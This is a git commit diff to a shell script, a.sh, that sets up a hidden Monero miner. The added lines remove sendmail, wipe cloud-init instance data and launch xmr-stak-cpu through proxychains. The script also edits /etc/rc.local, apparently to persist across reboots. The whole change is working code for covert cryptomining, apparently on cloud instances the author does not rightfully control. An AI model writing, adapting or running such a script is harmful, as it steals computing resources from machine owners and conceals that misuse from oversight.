9eb253e18ee1719e9b09def9d0ddcab824cb0752
smithinoz <smithinoz@users.noreply.github.com>
2017-06-18 21:41:45 +1000

    Update a.sh

--- a.sh
+++ a.sh
@@ -21,18 +21,17 @@ sudo sed -i -e "/m/test01/ax.sh" /etc/rc.local
 file="/flag"
 if [ -f "$file" ]
 then
-  exit
+  sudo yum remove sendmail -y
+  sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
+  rm -rf /var/lib/cloud/instance/*
+  sudo chmod +x /m/test01/proxychains/proxychains4
+  sudo chmod +x /m/test01/xmr/xmr-stak-cpu
+  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu
+  sudo reboot   
 else
   sudo /bin/su -c "echo 'xxxxx' >> /flag"
   sudo reboot  
 fi
-
-
-
-
-
-
-
 #while true; do
 #cd /m/test01/xmr/
 #sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
